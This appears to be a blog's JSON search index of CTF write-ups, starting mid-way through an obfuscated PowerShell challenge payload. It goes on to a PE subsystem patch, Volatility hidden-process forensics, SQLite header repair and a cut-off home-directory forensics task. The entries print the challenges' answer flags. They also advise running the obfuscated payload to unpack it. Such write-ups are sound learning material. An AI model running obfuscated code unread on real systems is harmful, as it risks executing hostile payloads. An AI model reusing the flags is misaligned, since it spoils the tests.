class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">(</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">&amp;</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">\"</span><span class=\"p\">\n</span></code></pre></div></div>\n\n<p>Unpacking is simple. Just run it in powershell as it’s written in payload.\n<img src=\"/images/2018-03-26-Securinets-CTF-duck-hunt-300/run.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] powershell run</p>\n\n<p>If “[CHar]” type values are output, the user can get the input value and check the comparison code. Within that code we can get the flag.</p>\n\n<p><img src=\"/images/2018-03-26-Securinets-CTF-duck-hunt-300/type.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] result of run</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$flag</span> <span class=\"o\">=</span> Read-Host-Prompt <span class=\"s1\">'Enter the password'</span>\nIf <span class=\"o\">(</span>flag <span class=\"nt\">-eq</span> <span class=\"s1\">'Flag{is_a_rubber_ducky_used_somewhere!}'</span>\n</code></pre></div></div>\n<p><img src=\"/images/2018-03-26-Securinets-CTF-duck-hunt-300/flag.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] flag</p>\n\n<p align=\"right\"><strong>Flag{is_a_rubber_ducky_used_somewhere!}</strong></p>\n"
    } ,
  
    {
      "title"    : "[2018_Sharif_CTF] RunMe(50)",
      "category" : "CTF2018_Sharif",
      "tags"     : "Reversing, string",
      "url"      : "/ctf/2018_sharif/2018/02/16/Sharif-CTF-RunMe-50/",
      "date"     : "2018-02-16 00:00:00 +0900",
      "content"   : "<h2 id=\"exercise\">Exercise</h2>\n\n<blockquote>\n  <p>Run the attached file. If you can, you will capture the flag.<br />\nNote: Apply the minimum changes to make the file executable. Then, the mentioned hash function is md5. Be sure to run it on a real Windows OS (not Wine, etc.)</p>\n</blockquote>\n\n<p><img src=\"/images/2018-02-16-Sharif-CTF-RunMe-50/exercise.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] exercise</p>\n\n<h2 id=\"solution\">Solution</h2>\n\n<p>binary를 정상적으로 실행시키는 것이 전부인 문제. PE 파일임을 알 수 있다. real Windows OS 에서 실행해야 한다고 명시되어 있지만, 가상 환경에서 문제 없이 돌아간다.</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> ✘ jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Reversing/50_Run me\nexiftool ./RunMe2.exe\nExifTool Version Number         : 10.55\nFile Name                       : RunMe2.exe\nDirectory                       : <span class=\"nb\">.</span>\nFile Size                       : 70 kB\nFile Modification Date/Time     : 2018:02:11 19:13:17+09:00\nFile Access Date/Time           : 2018:02:16 15:36:30+09:00\nFile Inode Change Date/Time     : 2018:02:11 19:13:17+09:00\nFile Permissions                : rw-r--r--\nFile Type                       : Win32 EXE\nFile Type Extension             : exe\nMIME Type                       : application/octet-stream\nMachine Type                    : Intel 386 or later, and compatibles\nTime Stamp                      : 2018:01:30 13:22:02+09:00\nPE Type                         : PE32\nLinker Version                  : 14.0\nCode Size                       : 41984\nInitialized Data Size           : 31744\nUninitialized Data Size         : 0\nEntry Point                     : 0x1250\nOS Version                      : 5.1\nImage Version                   : 0.0\nSubsystem Version               : 5.1\nSubsystem                       : Native\n</code></pre></div></div>\n\n<p>실행을 해보면, 정상적으로 동작하지 않는 것을 확인할 수 있다. 정상적인 PE binary와 비교했을 때, 차이점을 살펴보다. <code class=\"highlighter-rouge\">Subsystem</code> 항목이 Native 로 설정되어 있는 것을 확인할 수 있었는데 관련 정보를 찾아보니 보통, <code class=\"highlighter-rouge\">2</code>,<code class=\"highlighter-rouge\">3</code> 으로 지정되어 있는 것을 확인.\n<img src=\"/images/2018-02-16-Sharif-CTF-RunMe-50/error.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] execution error</i></p>\n\n<div class=\"highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>NATIVE : 1  --&gt;  Doesn't require a subsystem\nWindows GUI : 2 --&gt; Runs in the Windows GUI subsystem\nWINDOWS CUI : 3 --&gt; Runs in console subsystem\n</code></pre></div></div>\n\n<p>아래와 같이, <code class=\"highlighter-rouge\">Subsystem</code> offset을 수정해주었다. 그 결과, 실행에 성공했다는 string 과 함께, file의 hash 값이 flag임을 명시하고 있다.\n<img src=\"/images/2018-02-16-Sharif-CTF-RunMe-50/fix.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] fix subsystem</i></p>\n\n<pre><code class=\"language-cmd\">C:\\Users\\jsh05042\\Desktop\\sharif\\reversing&gt;python\nPython 2.7.6 (default, Nov 10 2013, 19:24:18) [MSC v.1500 32 bit (Intel)] on win32\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; import hashlib\n&gt;&gt;&gt; f = open('RunMe2.exe','rb')\n&gt;&gt;&gt; hashlib.md5(f.read()).hexdigest()\n'3de0531cb6069ff18543fe767e384b83'\n&gt;&gt;&gt;\n</code></pre>\n\n<p align=\"right\"><strong>SharifCTF{3de0531cb6069ff18543fe767e384b83}</strong></p>\n"
    } ,
  
    {
      "title"    : "[2018_Sharif_CTF] Hidden(100)",
      "category" : "CTF2018_Sharif",
      "tags"     : "Reversing, string",
      "url"      : "/ctf/2018_sharif/2018/02/16/Sharif-CTF-Hidden-100/",
      "date"     : "2018-02-16 00:00:00 +0900",
      "content"   : "<h2 id=\"exercise\">Exercise</h2>\n\n<blockquote>\n  <p>Find the hidden process.</p>\n</blockquote>\n\n<blockquote>\n  <p>The flag is SharifCTF{MD5(Process id)}.</p>\n</blockquote>\n\n<p><img src=\"/images/2018-02-16-Sharif-CTF-Hidden-100/exercise.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] exercise</p>\n\n<h2 id=\"solution\">Solution</h2>\n\n<p>숨겨진 프로세스를 찾아내는 문제. <code class=\"highlighter-rouge\">process</code> -&gt; <code class=\"highlighter-rouge\">Memory?</code> 직감에 압축을 풀고, binary를 살펴보면, memory dump 파일임을 알 수 있다. volatility를 이용해 imageinfo 결과 xp memory dump 파일임을 확인.</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Forensic/100_ Hidden\nvol <span class=\"nt\">-f</span> ./dump imageinfo\nVolatility Foundation Volatility Framework 2.6\nINFO    : volatility.debug    : Determining profile based on KDBG search...\nWARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present <span class=\"k\">in </span>vtypes\nWARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present <span class=\"k\">in </span>vtypes\nWARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present <span class=\"k\">in </span>vtypes\n          Suggested Profile<span class=\"o\">(</span>s<span class=\"o\">)</span> : WinXPSP2x86, WinXPSP3x86 <span class=\"o\">(</span>Instantiated with WinXPSP2x86<span class=\"o\">)</span>\n                     AS Layer1 : IA32PagedMemoryPae <span class=\"o\">(</span>Kernel AS<span class=\"o\">)</span>\n                     AS Layer2 : FileAddressSpace <span class=\"o\">(</span>/Users/Mac/Desktop/CTF/2018_Sharif_CTF/Forensic/100_ Hidden/dump<span class=\"o\">)</span>\n                      PAE <span class=\"nb\">type</span> : PAE\n                           DTB : 0x359000L\n                          KDBG : 0x80545c60L\n          Number of Processors : 1\n     Image Type <span class=\"o\">(</span>Service Pack<span class=\"o\">)</span> : 3\n                KPCR <span class=\"k\">for </span>CPU 0 : 0xffdff000L\n             KUSER_SHARED_DATA : 0xffdf0000L\n           Image date and <span class=\"nb\">time</span> : 2018-01-28 17:35:20 UTC+0000\n     Image <span class=\"nb\">local </span>date and <span class=\"nb\">time</span> : 2018-01-28 21:05:20 +0330\n</code></pre></div></div>\n\n<p>process 확인을 위해서, <code class=\"highlighter-rouge\">pslist</code>, <code class=\"highlighter-rouge\">psscan</code> 두 명령어를 수행하고, psscan 에서 추가적으로 식별되는 항목을 확인할 수 있다.</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Forensic/100_ Hidden\n vol <span class=\"nt\">-f</span> ./dump <span class=\"nv\">profile</span><span class=\"o\">=</span>WinXPSP2x86 pslist\nVolatility Foundation Volatility Framework 2.6\nOffset<span class=\"o\">(</span>V<span class=\"o\">)</span>  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit\n<span class=\"nt\">----------</span> <span class=\"nt\">--------------------</span> <span class=\"nt\">------</span> <span class=\"nt\">------</span> <span class=\"nt\">------</span> <span class=\"nt\">--------</span> <span class=\"nt\">------</span> <span class=\"nt\">------</span> <span class=\"nt\">------------------------------</span> <span class=\"nt\">------------------------------</span>\n0x81242a00 System                    4      0     57      263 <span class=\"nt\">------</span>      0\n0xff391900 smss.exe                548      4      3       19 <span class=\"nt\">------</span>      0 2018-01-28 16:59:16 UTC+0000\n0xff36bda0 csrss.exe               620    548     12      305      0      0 2018-01-28 16:59:19 UTC+0000\n0xff39f608 winlogon.exe            644    548     19      537      0      0 2018-01-28 16:59:20 UTC+0000\n0xff391488 services.exe            688    644     16      353      0      0 2018-01-28 16:59:24 UTC+0000\n0xff390410 lsass.exe               700    644     20      349      0      0 2018-01-28 16:59:25 UTC+0000\n0xff378798 vmacthlp.exe            856    688      1       25      0      0 2018-01-28 16:59:34 UTC+0000\n0xff3a59c0 svchost.exe             900    688     17      211      0      0 2018-01-28 16:59:39 UTC+0000\n0xff3bc378 svchost.exe             988    688     11      235      0      0 2018-01-28 16:59:47 UTC+0000\n0xff3cb6e0 svchost.exe            1024    688     54     1107      0      0 2018-01-28 16:59:51 UTC+0000\n0xff2077a8 svchost.exe            1188    688      4       57      0      0 2018-01-28 16:59:53 UTC+0000\n0xff3a7878 svchost.exe            1236    688     10      167      0      0 2018-01-28 16:59:56 UTC+0000\n0xff1bbcf0 spoolsv.exe            1508    688     11      140      0      0 2018-01-28 17:00:19 UTC+0000\n0xff1b1020 explorer.exe           1576   1444     12      404      0      0 2018-01-28 17:00:24 UTC+0000\n0xff1aa9f0 svchost.exe            1604    688      4      105      0      0 2018-01-28 17:00:25 UTC+0000\n0xff197b20 svchost.exe            1692    688      3       94      0      0 2018-01-28 17:00:31 UTC+0000\n0x811244c0 rundll32.exe            396   1576      4       70      0      0 2018-01-28 17:02:48 UTC+0000\n0xff1c30e8 wscntfy.exe             920   1024      1       31      0      0 2018-01-28 17:05:09 UTC+0000\n</code></pre></div></div>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Forensic/100_ Hidden\n vol <span class=\"nt\">-f</span> ./dump <span class=\"nv\">profile</span><span class=\"o\">=</span>WinXPSP2x86 psscan\nVolatility Foundation Volatility Framework 2.6\nOffset<span class=\"o\">(</span>P<span class=\"o\">)</span>          Name                PID   PPID PDB        Time created                   Time exited\n<span class=\"nt\">------------------</span> <span class=\"nt\">----------------</span> <span class=\"nt\">------</span> <span class=\"nt\">------</span> <span class=\"nt\">----------</span> <span class=\"nt\">------------------------------</span> <span class=\"nt\">------------------------------</span>\n0x000000000096c0e8 wscntfy.exe         920   1024 0x007002c0 2018-01-28 17:05:09 UTC+0000\n0x00000000010eb4c0 rundll32.exe        396   1576 0x007001a0 2018-01-28 17:02:48 UTC+0000\n0x0000000001209a00 System                4      0 0x00359000\n0x0000000001bbd488 services.exe        688    644 0x00700080 2018-01-28 16:59:24 UTC+0000\n0x0000000001bbd900 smss.exe            548      4 0x00700020 2018-01-28 16:59:16 UTC+0000\n0x0000000001c279c0 svchost.exe         900    688 0x00700100 2018-01-28 16:59:39 UTC+0000\n0x0000000001c58798 vmacthlp.exe        856    688 0x007000c0 2018-01-28 16:59:34 UTC+0000\n0x0000000001de4878 svchost.exe        1236    688 0x00700180 2018-01-28 16:59:56 UTC+0000\n0x0000000001e64350 vmtoolsd.exe        404   1576 0x00700260 2018-01-28 17:02:50 UTC+0000\n0x0000000001e6d608 winlogon.exe        644    548 0x00700060 2018-01-28 16:59:20 UTC+0000\n0x0000000001ebe168 cmd.exe            1704   1576 0x007002a0 2018-01-28 17:30:47 UTC+0000   2018-01-28 17:34:00 UTC+0000\n0x0000000001ecd378 svchost.exe         988    688 0x00700120 2018-01-28 16:59:47 UTC+0000\n0x0000000001fbd6e0 svchost.exe        1024    688 0x00700140 2018-01-28 16:59:51 UTC+0000\n0x0000000001fbe410 lsass.exe           700    644 0x007000a0 2018-01-28 16:59:25 UTC+0000\n0x00000000021a7da0 csrss.exe           620    548 0x00700040 2018-01-28 16:59:19 UTC+0000\n0x00000000025b7020 explorer.exe       1576   1444 0x007001e0 2018-01-28 17:00:24 UTC+0000\n0x0000000002dbb448 wmiprvse.exe        908    900 0x00700240 2018-01-28 17:32:51 UTC+0000   2018-01-28 17:34:22 UTC+0000\n0x0000000002e7eb20 svchost.exe        1692    688 0x00700220 2018-01-28 17:00:31 UTC+0000\n0x000000000308d9f0 svchost.exe        1604    688 0x00700200 2018-01-28 17:00:25 UTC+0000\n0x00000000031b1cf0 spoolsv.exe        1508    688 0x007001c0 2018-01-28 17:00:19 UTC+0000\n0x00000000039347a8 svchost.exe        1188    688 0x00700160 2018-01-28 16:59:53 UTC+0000\n</code></pre></div></div>\n\n<p>두 결과의 차이점 항목을 확인해보면, 아래와 같이 3개의 항목을 식별할 수 있다. <code class=\"highlighter-rouge\">cmd.exe</code>, <code class=\"highlighter-rouge\">wmiprvse.exe</code> 두 항목은 process 가 종료되어 pslist에서 식별되지 않았음을 알 수 있지만 <code class=\"highlighter-rouge\">vmtoolsd.exe</code> 항목은 종료된 기록이 없음과 동시에 pslist에서 식별되지 않았으므로 해당 항목이 은닉된 프로세스임을 알 수 있다. (자세히 보면, vmtools와 유사한 <code class=\"highlighter-rouge\">vmtoolsd</code> 파일명을 사용하고 있다.)</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>0x0000000001ebe168 cmd.exe            1704   1576 0x007002a0 2018-01-28 17:30:47 UTC+0000   2018-01-28 17:34:00 UTC+0000\n0x0000000002dbb448 wmiprvse.exe        908    900 0x00700240 2018-01-28 17:32:51 UTC+0000   2018-01-28 17:34:22 UTC+0000\n0x0000000001e64350 vmtoolsd.exe        404   1576 0x00700260 2018-01-28 17:02:50 UTC+0000\n</code></pre></div></div>\n\n<p>md5 값이 flag 이므로 변환해주도록 한다.</p>\n<div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> <span class=\"n\">jsh05042</span><span class=\"nd\">@Macs</span><span class=\"o\">-</span><span class=\"n\">MacBook</span><span class=\"o\">-</span><span class=\"n\">Pro</span> <span class=\"err\"></span> <span class=\"o\">~/</span><span class=\"n\">Desktop</span><span class=\"o\">/</span><span class=\"n\">CTF</span><span class=\"o\">/</span><span class=\"mi\">2018</span><span class=\"n\">_Sharif_CTF</span><span class=\"o\">/</span><span class=\"n\">Forensic</span><span class=\"o\">/</span><span class=\"mi\">100</span><span class=\"n\">_</span> <span class=\"n\">Hidden</span><span class=\"err\"></span>\n<span class=\"err\"></span> <span class=\"n\">python</span>\n<span class=\"n\">Python</span> <span class=\"mf\">2.7</span><span class=\"o\">.</span><span class=\"mi\">10</span> <span class=\"p\">(</span><span class=\"n\">default</span><span class=\"p\">,</span> <span class=\"n\">Feb</span>  <span class=\"mi\">7</span> <span class=\"mi\">2017</span><span class=\"p\">,</span> <span class=\"mo\">00</span><span class=\"p\">:</span><span class=\"mi\">08</span><span class=\"p\">:</span><span class=\"mi\">15</span><span class=\"p\">)</span>\n<span class=\"p\">[</span><span class=\"n\">GCC</span> <span class=\"mf\">4.2</span><span class=\"o\">.</span><span class=\"mi\">1</span> <span class=\"n\">Compatible</span> <span class=\"n\">Apple</span> <span class=\"n\">LLVM</span> <span class=\"mf\">8.0</span><span class=\"o\">.</span><span class=\"mi\">0</span> <span class=\"p\">(</span><span class=\"n\">clang</span><span class=\"o\">-</span><span class=\"mf\">800.0</span><span class=\"o\">.</span><span class=\"mi\">34</span><span class=\"p\">)]</span> <span class=\"n\">on</span> <span class=\"n\">darwin</span>\n<span class=\"n\">Type</span> <span class=\"s\">\"help\"</span><span class=\"p\">,</span> <span class=\"s\">\"copyright\"</span><span class=\"p\">,</span> <span class=\"s\">\"credits\"</span> <span class=\"ow\">or</span> <span class=\"s\">\"license\"</span> <span class=\"k\">for</span> <span class=\"n\">more</span> <span class=\"n\">information</span><span class=\"o\">.</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"kn\">import</span> <span class=\"nn\">hashlib</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">hashlib</span><span class=\"o\">.</span><span class=\"n\">md5</span><span class=\"p\">(</span><span class=\"s\">'404'</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"n\">hexdigest</span><span class=\"p\">()</span>\n<span class=\"s\">'4f4adcbf8c6f66dcfc8a3282ac2bf10a'</span>\n<span class=\"o\">&gt;&gt;&gt;</span>\n</code></pre></div></div>\n\n<p align=\"right\"><strong>SharifCTF{4f4adcbf8c6f66dcfc8a3282ac2bf10a}</strong></p>\n"
    } ,
  
    {
      "title"    : "[2018_Sharif_CTF] Crashed DB(50)",
      "category" : "CTF2018_Sharif",
      "tags"     : "Forensic, sqlite3, db",
      "url"      : "/ctf/2018_sharif/2018/02/16/Sharif-CTF-Crashed-DB-50/",
      "date"     : "2018-02-16 00:00:00 +0900",
      "content"   : "<h2 id=\"exercise\">Exercise</h2>\n\n<blockquote>\n  <p>We lost some data when we were delivering our DB.\nCan you recover it??\nHint: SQLite</p>\n</blockquote>\n\n<p><img src=\"/images/2018-02-16-Sharif-CTF-Crashed-DB-50/exercise.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] exercise</p>\n\n<h2 id=\"solution\">Solution</h2>\n\n<p>Forensic 첫번째 문제, DB 전송 과정에서 일부 데이터를 손실했으며, 이를 복구할 수 있는지 묻고 있다. SQLite 가 hint로 주어진 것을 보아, sqlite db 관련 문제임을 확인.</p>\n\n<p>sqlite3 를 통해, 해당 binary를 읽어보면, db 정보가 전혀 식별되지 않는 것을 확인할 수 있으며 table 조회 시, error를 볼 수 있다.</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Forensic/50_Crashed DB\n sqlite3 ./db0.db\nSQLite version 3.16.0 2016-11-04 19:09:39\nEnter <span class=\"s2\">\".help\"</span> <span class=\"k\">for </span>usage hints.\nsqlite&gt; .dbinfo\ndatabase page size:  0\nwrite format:        0\n<span class=\"nb\">read </span>format:         0\nreserved bytes:      0\nfile change counter: 0\ndatabase page count: 0\nfreelist page count: 0\nschema cookie:       0\nschema format:       0\ndefault cache size:  0\nautovacuum top root: 0\nincremental vacuum:  0\ntext encoding:       0\nuser version:        0\napplication id:      0\nsoftware version:    0\nnumber of tables:    0\nnumber of indexes:   0\nnumber of triggers:  0\nnumber of views:     0\nschema size:         0\n</code></pre></div></div>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>sqlite&gt; .table\nError: file is encrypted or is not a database\n</code></pre></div></div>\n\n<p>binary 확인 시, signature를 포함한 header 정보가 날아가 있는 것을 확인할 수 있다.\n<img src=\"/images/2018-02-16-Sharif-CTF-Crashed-DB-50/init.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] Header information</i></p>\n\n<p>적당한, sqlite db 파일을 하나 만들고 <code class=\"highlighter-rouge\">db0.db</code>의 0번째 offset 인 0x0D 로 구분되는 지점까지의 header offset을 가져다 넣어준다.\n<img src=\"/images/2018-02-16-Sharif-CTF-Crashed-DB-50/tmp_header.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] tmp Header</i></p>\n\n<p><img src=\"/images/2018-02-16-Sharif-CTF-Crashed-DB-50/fix_header.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] fixed Header</i></p>\n\n<p>remake 한 db 파일의 정보를 확인하여, table 정보를 식별하려 하면, 아래와 같은 error message를 확인할 수 있다.</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Forensic/50_Crashed DB\n sqlite3 ./remake_db0.db\nSQLite version 3.16.0 2016-11-04 19:09:39\nEnter <span class=\"s2\">\".help\"</span> <span class=\"k\">for </span>usage hints.\nsqlite&gt; .dbinfo\ndatabase page size:  1024\nwrite format:        1\n<span class=\"nb\">read </span>format:         1\nreserved bytes:      0\nfile change counter: 1\ndatabase page count: 2\nfreelist page count: 0\nschema cookie:       1\nschema format:       4\ndefault cache size:  0\nautovacuum top root: 0\nincremental vacuum:  0\ntext encoding:       1 <span class=\"o\">(</span>utf8<span class=\"o\">)</span>\nuser version:        0\napplication id:      0\nsoftware version:    3008004\nnumber of tables:    0\nnumber of indexes:   0\nnumber of triggers:  0\nnumber of views:     0\nschema size:         0\n\nsqlite&gt; .table\nError: database disk image is malformed\n</code></pre></div></div>\n\n<p>Error 정보를 확인해보면, page 와 관련이 있었다. 주어진 db 의 크기는 8kb size를 가진다. 아래와 같이 page의 크기를 0x1000 (4096) 으로 명시하고, 하나의 page 크기가 0x1000일 때, 해당 db는 8kb 이므로 2 page로 구성된다. 따라서 offset을 0x02로 수정한다.\n<img src=\"/images/2018-02-16-Sharif-CTF-Crashed-DB-50/fixed.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] fixed Header Offset</i></p>\n\n<p>이후, table과 table schema를 정상적으로 식별할 수 있었다.</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>sqlite&gt; .schema\nCREATE TABLE tbl <span class=\"o\">(</span>Glaf varchar<span class=\"o\">(</span>15<span class=\"o\">)</span>, Flag varchar<span class=\"o\">(</span>1<span class=\"o\">)</span>, Lfag varchar<span class=\"o\">(</span>15<span class=\"o\">))</span><span class=\"p\">;</span>\n\nsqlite&gt; .table\ntbl\n</code></pre></div></div>\n\n<p><code class=\"highlighter-rouge\">tbl</code>이라는 table 내에서 <code class=\"highlighter-rouge\">Flag</code>라는 column을 하나 확인할 수 있는데 해당  정보를 출력하면 flag를 확인할 수 있다.</p>\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>✘ jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Forensic/50_Crashed DB\n sqlite3 ./remake_db0.db\nSQLite version 3.16.0 2016-11-04 19:09:39\nEnter <span class=\"s2\">\".help\"</span> <span class=\"k\">for </span>usage hints.\nsqlite&gt; <span class=\"k\">select </span>Flag from tbl<span class=\"p\">;</span>\nS\nh\na\nr\ni\nf\nC\nT\nF\n<span class=\"o\">{</span>\n7\nd\n9\ne\nd\n4\na\n5\n8\n6\n7\nf\n6\nb\nd\n3\n7\n6\n9\n2\n8\na\n3\ne\nd\n7\n8\n3\n7\na\n0\n7\n<span class=\"o\">}</span>\nsqlite&gt;\n</code></pre></div></div>\n\n<p align=\"right\"><strong>SharifCTF{7d9ed4a5867f6bd376928a3ed7837a07}</strong></p>\n"
    } ,
  
    {
      "title"    : "[2018_Sharif_CTF] Client01(75)",
      "category" : "CTF2018_Sharif",
      "tags"     : "Forensic, string",
      "url"      : "/ctf/2018_sharif/2018/02/15/Sharif-CTF-Client01-75/",
      "date"     : "2018-02-15 00:00:00 +0900",
      "content"   : "<h2 id=\"exercise\">Exercise</h2>\n\n<blockquote>\n  <p>Attached file is the homepage of the client01. He knows the flag.</p>\n</blockquote>\n\n<p><img src=\"/images/2018-02-15-Sharif-CTF-Client01-75/exercise.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] exercise</p>\n\n<h2 id=\"solution\">Solution</h2>\n\n<p>첨부된, Client01의 홈페이지 내에서 Flag를 찾는 문제. 주어진 파일의 압축을 풀면 아래와 같은 디렉토리 구조를 확인할 수 있다. <code class=\"highlighter-rouge\">ls -al</code>로 살펴볼 경우, 숨김 파일로 처리된 항목이 다수 존재하는 것을 확인.</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Forensic/75_Client01\n tree ./client01\n./client01\n├── Desktop\n├── Documents\n├── Downloads\n├── Music\n├── Pictures\n├── Public\n├── Templates\n└── Videos\n\njsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Forensic/75_Client01\nls <span class=\"nt\">-alr</span> ./client01\ntotal 104\ndrwxr-xr-x@  2 jsh05042  staff     68  1 21 16:33 Videos\ndrwxr-xr-x@  2 jsh05042  staff     68  1 21 16:33 Templates\ndrwxr-xr-x@  2 jsh05042  staff     68  1 21 16:33 Public\ndrwxr-xr-x@  2 jsh05042  staff     68  1 21 16:33 Pictures\ndrwxr-xr-x@  2 jsh05042  staff     68  1 21 16:33 Music\ndrwxr-xr-x@  2 jsh05042  staff     68  1 21 16:33 Downloads\ndrwxr-xr-x@  2 jsh05042  staff     68  1 21 16:33 Documents\ndrwxr-xr-x@  2 jsh05042  staff     68  1 21 16:33 Desktop\n<span class=\"nt\">-rw-------</span>@  1 jsh05042  staff   7046  1 21 16:44 .xsession-errors.old\n<span class=\"nt\">-rw-------</span>@  1 jsh05042  staff   7072  1 24 14:13 .xsession-errors\ndrwxr-xr-x@  6 jsh05042  staff    204  2 15 19:12 .thunderbird\n<span class=\"nt\">-rw-r--r--</span>@  1 jsh05042  staff    675  1 21 16:20 .profile\ndrwxr-xr-x@  5 jsh05042  staff    170  2 15 19:12 .mozilla\ndrwxr-xr-x@  4 jsh05042  staff    136  2 15 19:12 .local\ndrwxr-xr-x@  4 jsh05042  staff    136  2 15 19:12 .gnupg\ndrwx------@  2 jsh05042  staff     68  1 21 16:33 .gconf\n<span class=\"nt\">-rw-r--r--</span>@  1 jsh05042  staff     55  1 21 16:33 .dmrc\ndrwxr-xr-x@ 12 jsh05042  staff    408  2 15 19:12 .config\ndrwxr-xr-x@  6 jsh05042  staff    204  2 15 19:12 .cinnamon\ndrwxr-xr-x@  7 jsh05042  staff    238  2 15 19:11 .cache\n<span class=\"nt\">-rw-r--r--</span>@  1 jsh05042  staff   3526  1 21 16:20 .bashrc\n<span class=\"nt\">-rw-r--r--</span>@  1 jsh05042  staff    220  1 21 16:20 .bash_logout\n<span class=\"nt\">-rw-------</span>@  1 jsh05042  staff     51  1 24 14:09 .Xauthority\n<span class=\"nt\">-rw-------</span>@  1 jsh05042  staff    632  1 24 14:09 .ICEauthority\n<span class=\"nt\">-rw-r--r--</span>@  1 jsh05042  staff  10244  2 15 19:12 .DS_Store\ndrwxr-xr-x   6 jsh05042  staff    204  2 15 19:11 ..\ndrwxr-xr-x@ 27 jsh05042  staff    918  2 15 19:11 <span class=\"nb\">.</span>\n</code></pre></div></div>\n\n<p>grep 을 이용해, flag 관련 문자열을 탐색한 결과 일부 파일 내에서 해당 문자열이 